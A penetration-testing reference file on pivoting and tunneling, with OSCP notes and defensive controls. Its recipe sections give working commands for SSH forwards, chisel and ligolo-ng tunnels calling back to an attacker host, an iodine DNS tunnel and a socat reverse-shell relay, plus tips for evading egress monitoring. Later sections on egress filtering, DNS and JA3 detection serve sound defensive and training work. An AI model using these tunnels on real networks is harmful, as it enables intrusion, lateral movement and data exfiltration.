# Pivoting and Tunneling

Moving from one network segment to another through a compromised host.
Port forwarding, SOCKS proxies, DNS tunnels, ICMP tunnels. This file
covers the tooling and the network controls that block it.

> [!CAUTION]
> Pivoting through a compromised host changes its network behavior.
> If the host is monitored, the new outbound connections may trigger
> alerts. Only pivot through systems you own or have written
> authorization to test.

---

## 1. Overview

After compromising a host, the attacker usually has access to networks
the original attack host cannot reach. Pivoting is the technique of
using the compromised host as a relay to reach those networks.

Three layers of pivoting:

- **Port forwarding (L4):** single TCP/UDP port forwarded through the
  pivot. Simple, but one listener per service.
- **SOCKS proxy (L4/L5):** a proxy that accepts arbitrary TCP
  connections. The attacker's tools (nmap, curl, browser) connect
  through it. Most common technique.
- **Application-layer tunnels (L7):** DNS, ICMP, HTTP. Used when
  only one protocol is allowed through the egress firewall.

Each layer has trade-offs between simplicity, speed, and stealth.

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify reachable networks from the pivot

```bash
# On the pivot host
ip a
ip route
arp -an

# Which networks does this host see?
# Look for second NICs, additional routes, or VPN interfaces
```

### 2.2 Identify egress filtering

From the pivot, test outbound connectivity:

```bash
# TCP egress
for port in 22 80 443 8080 53; do
    timeout 2 bash -c "echo > /dev/tcp/8.8.8.8/$port" 2>/dev/null && \
      echo "TCP $port open"
done

# DNS egress
dig @8.8.8.8 google.com +short

# ICMP egress
ping -c 2 8.8.8.8
```

Expected result (typical locked-down host):

```text
TCP 80 open
TCP 443 open
TCP 53 open
# DNS: works
# ICMP: blocked
```

### 2.3 Identify the pivot's outbound IP

```bash
curl -s ifconfig.me
# Or
curl -s https://api.ipify.org
```

This is the IP your attack host must connect to when receiving a
reverse tunnel.

---

## 3. Common Attack Vectors

### 3.1 SSH local port forwarding

Forward a port on the pivot to a service reachable from the pivot.

```text
Victim network: 10.10.10.0/24
Attacker:       192.168.1.10
Pivot:          10.10.10.5 (compromised)

Attacker -> Pivot (SSH) -> 10.10.10.20:3389 (RDP)
```

`ssh -L 3389:10.10.10.20:3389 user@pivot` makes `localhost:3389` on
the attacker reach `10.10.10.20:3389`.

### 3.2 SSH remote port forwarding

Expose a port on the pivot back to the attacker.

```text
Pivot -> Attacker: expose the pivot's 127.0.0.1:8080 as
attacker's 127.0.0.1:9000
```

`ssh -R 9000:127.0.0.1:8080 user@attacker` makes `localhost:9000` on
the attacker reach the pivot's localhost:8080.

### 3.3 Dynamic port forwarding (SOCKS)

`ssh -D 1080 user@pivot` creates a SOCKS5 proxy on the attacker's
localhost:1080. Tools that support SOCKS5 (nmap, curl, proxychains)
can route through it.

### 3.4 Chisel (TCP tunnel over HTTP)

A single binary that creates a TCP tunnel over HTTP. Useful when SSH
is not available on the pivot, or when only HTTP egress is allowed.

### 3.5 ligolo-ng (TUN-based tunnel)

Creates a real TUN interface on the attacker. Tools do not need
proxychains; they route through the tunnel transparently. Faster
than SOCKS for many concurrent connections.

### 3.6 DNS tunneling

When only DNS egress is allowed. Tools: iodine, dnscat2, dns2tcp.
Slow but hard to block without breaking DNS.

### 3.7 ICMP tunneling

When ICMP is allowed (rare on modern networks). Tools: ptunnel-ng,
icmpsh. Often blocked by egress firewalls.

---

## 4. Exploitation Recipes

### 4.1 SSH local port forward

```bash
# On attacker
ssh -L 3389:10.10.10.20:3389 user@pivot
# Now: rdesktop localhost:3389
```

For multiple ports, use multiple `-L` flags, or `-D` (SOCKS).

### 4.2 SSH dynamic port forward (SOCKS5)

```bash
# On attacker
ssh -D 1080 -N -f user@pivot

# Configure proxychains
cat /etc/proxychains4.conf | tail -3
# [ProxyList]
# socks5 127.0.0.1 1080

# Use proxychains
proxychains nmap -sT -Pn -p 22,80,443 10.10.10.20
proxychains curl http://10.10.10.20/
```

Expected output (proxychains):

```text
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.20:80-<><>-OK
<HTML><HEAD><TITLE>...</TITLE></HEAD>
```

### 4.3 SSH remote forward (reverse tunnel)

```bash
# On pivot - connect back to attacker
ssh -R 9000:127.0.0.1:8080 user@attacker -N -f

# On attacker
curl http://localhost:9000/
```

Bypasses NAT on the pivot's network, useful when the pivot cannot be
reached from the attacker directly.

### 4.4 Chisel tunnel

```bash
# On attacker (server)
./chisel server -p 8000 --reverse

# On pivot (client)
./chisel client <attacker-ip>:8000 R:1080:socks

# Now attacker has SOCKS5 on localhost:1080
```

Chisel supports multiple tunnels in one connection, HTTP transport,
and TLS. Ideal when SSH is unavailable.

### 4.5 ligolo-ng

```bash
# On attacker
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot
./agent -connect <attacker-ip>:11601 -ignore-cert

# On attacker (in proxy console)
session
ifconfig
start
```

Now the attacker can `nmap 10.10.10.0/24` directly - the ligolo TUN
interface routes traffic through the pivot. No proxychains needed.

Expected output (proxy console):

```text
[Agent : pivot] -> Session ID: 1
[Agent : pivot] -> Interface: eth0 - 10.10.10.5/24
[Agent : pivot] -> Interface: eth1 - 172.16.0.5/24
[Agent : pivot] -> Starting tunnel...
```

### 4.6 DNS tunnel with iodine

```bash
# On attacker (requires a domain pointing to the attacker's VPS)
sudo iodined -f -c -P <PASSWORD> 10.0.0.1 t.example.com

# On pivot
sudo iodine -f -P <PASSWORD> t.example.com

# Now pivot has a dns0 interface (10.0.0.2); all traffic through it
# goes to the attacker over DNS
```

### 4.7 Reverse shell + socat relay

```bash
# On pivot - forward a local port to attacker
socat TCP-LISTEN:4444,fork TCP:<attacker-ip>:5555

# On attacker - listen for the shell
nc -lvnp 5555
```

Useful when the pivot cannot create outbound connections to the
target network, but the target can connect to the pivot.

---

## 5. Post-Exploitation

Pivoting is a **means**, not an end. After establishing the tunnel:

- **Scan the new network** (nmap through SOCKS or TUN).
- **Reuse credentials** from the pivot on the new segment.
- **Move laterally** to the next host (see Active Directory files).
- **Collect credentials** from the new segment (Responder, relays).
- **Exfiltrate data** through the tunnel.

Multi-hop pivoting:

- Chain two SSH `-D` proxies: `proxychains` supports multiple hops.
- Or chain chisel/ligolo agents through each pivot.
- For deep pivots, ligolo-ng is easier than stacked proxychains.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High (if egress is not filtered) |
| Preconditions | Compromised host with outbound connectivity |
| Detectability | Medium - egress monitoring and anomaly detection |
| Business impact | Lateral movement, data exfiltration |

Pivoting is the standard way an attacker moves from an initial
foothold to the internal network. Without it, a compromised DMZ host
remains isolated.

---

## 7. Root Causes (AppSec)

- Overly permissive egress filtering (all ports allowed outbound).
- No TLS inspection (encrypted tunnels look like normal HTTPS).
- No DNS monitoring (DNS tunnels blend with legitimate queries).
- Flat internal networks (one compromised host reaches everything).
- No network segmentation between user, server, and management zones.

---

## 8. Preventive Controls (AppSec)

### 8.1 Egress filtering

Block outbound traffic to everything except known-good destinations:

```text
# Example firewall rules (conceptual)
ALLOW  internal-hosts -> proxy:3128
ALLOW  internal-hosts -> dns-server:53
ALLOW  internal-hosts -> update-server:443
DROP   internal-hosts -> any
```

Deny all outbound by default. Allow only the specific services the
host needs. This defeats most tunneling (the tunnel port is blocked).

### 8.2 TLS inspection

For HTTP/HTTPS egress, terminate TLS at a proxy (NGFW, Zscaler, etc.).
Encrypted tunnels over HTTPS look like normal TLS traffic until
decrypted. After decryption, anomalous patterns (long-lived
connections, high entropy) become visible.

### 8.3 DNS monitoring

- Log all DNS queries from internal hosts.
- Alert on high volume of TXT/NULL queries.
- Alert on queries to newly-registered domains.
- Use a DNS sinkhole for known C2 domains.

### 8.4 Network segmentation

- Separate user, server, management, and OT networks.
- Use a firewall between segments; do not rely on VLANs alone.
- Zero Trust: each host-to-host connection requires authentication.

### 8.5 Restrict outbound from servers

Most servers do not need to initiate outbound connections. Block
outbound from server VLANs except to specific update servers. This
defeats reverse tunnels from compromised servers.

### 8.6 Application allow-listing

- Block unapproved binaries from running (AppLocker, WDAC).
- Block SSH clients and tunneling tools on hosts that do not need them.
- This does not stop built-in tools (PowerShell remoting, BITS), but
  it raises the bar.

---

## 9. Detection Controls (AppSec)

### 9.1 Egress anomaly detection

- Long-lived outbound connections to a single external IP.
- Outbound connections on unusual ports.
- Beaconing patterns (regular intervals, small payloads).

### 9.2 TLS fingerprinting (JA3/JA4)

Tools have distinctive TLS fingerprints:

- Chisel uses Go's crypto/tls - different JA3 than Chrome.
- ligolo-ng uses Go's crypto/tls with self-signed certs.
- SSH clients have their own fingerprints.

Alert on JA3 hashes that do not match the expected user-agent pool.

### 9.3 DNS anomaly detection

- Volume: > 1000 TXT queries from one host in an hour.
- Entropy: subdomains with high Shannon entropy (base32/base64).
- Length: query names unusually long (> 50 chars).

### 9.4 NetFlow / IPFIX analysis

- Internal host suddenly sending traffic to many new destinations.
- Traffic between segments that should not communicate.
- Asymmetric flows (initiation from server VLAN to user VLAN).

### 9.5 SIEM rules

- Alert if a server initiates more than N outbound connections per minute.
- Alert if an internal host starts a long-lived connection to a
  country not seen before.
- Alert on new JA3 hashes appearing in the network.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **Egress filtering:** from an internal host, try to connect to an
   arbitrary external IP on port 4444. Should be blocked.
2. **TLS inspection:** start a chisel server on an external host, and
   a chisel client internally. The NGFW should detect and block the
   connection (or log a distinctive JA3).
3. **DNS monitoring:** run iodine client against a controlled
   domain. The DNS monitoring should flag the volume/entropy.
4. **Segmentation:** from a user VLAN, try to reach a management
   interface. Should be blocked by the firewall.
5. **Server egress:** from a server, try to reach the internet on
   port 443. Should be blocked unless explicitly allowed.

---

## 11. OSCP Notes

Pivoting is **heavily tested** in the OSCP exam:

- The exam often has a network where you must pivot to reach the
  final target.
- SSH local forward (`-L`), dynamic forward (`-D`), and proxychains
  are the standard techniques.
- Chisel is allowed in the exam (it is a legitimate tool), but the
  report must document exactly how it was used.

**Report tips:**

- Document the pivot host, the command used, and the resulting
  connectivity.
- Include a screenshot showing the tunnel is working (e.g.
  `proxychains nmap` output).
- Explain why the pivot was needed (which network was unreachable
  from the attacker).

See `methodology/OSCP-Reporting.md` for the report structure.

---

## 12. Production Notes

- **Pivoting is loud if egress is monitored.** Assume the blue team
  sees outbound connections to your attack host. Use HTTPS
  transport (chisel over TLS, ligolo-ng with valid cert) to blend in.
- **Chisel and ligolo-ng are not malware.** They are legitimate
  tools used by sysadmins. AV/EDR may still flag them if used
  suspiciously (e.g. from a user's home directory, without
  installation).
- **SSH tunnels are the simplest and most reliable.** Use them
  first. Fall back to chisel or ligolo when SSH is unavailable.
- **Proxychains is slow for large scans.** Use `-sT` (TCP connect)
  with nmap and limit concurrency. For faster scans, use ligolo-ng
  (TUN mode) instead of SOCKS.
- **DNS tunnels are slow and detectable.** Use only when no other
  egress is possible.
- **Reverse tunnels require a public IP on the attacker side.**
  A VPS or a port-forwarded home connection is needed.

---

## 13. References

- OpenSSH manual - `man ssh` (LocalForward, RemoteForward, DynamicForward)
- Chisel - TCP/UDP tunnel over HTTP - https://github.com/jpillora/chisel
- ligolo-ng - TUN-based tunneling - https://github.com/nicocha30/ligolo-ng
- iodine - DNS tunneling - https://code.kryo.se/iodine/
- ptunnel-ng - ICMP tunneling - https://github.com/utoni/ptunnel-ng
- proxychains-ng - https://github.com/rofl0r/proxychains-ng
- MITRE ATT&CK T1572 - Protocol Tunneling - https://attack.mitre.org/techniques/T1572/
- MITRE ATT&CK T1090 - Proxy - https://attack.mitre.org/techniques/T1090/
- NIST SP 800-115 - Technical Guide to Information Security Testing
- HackTricks - Pivoting and Port Forwarding
- `methodology/OSCP-Reporting.md` - OSCP pivot documentation
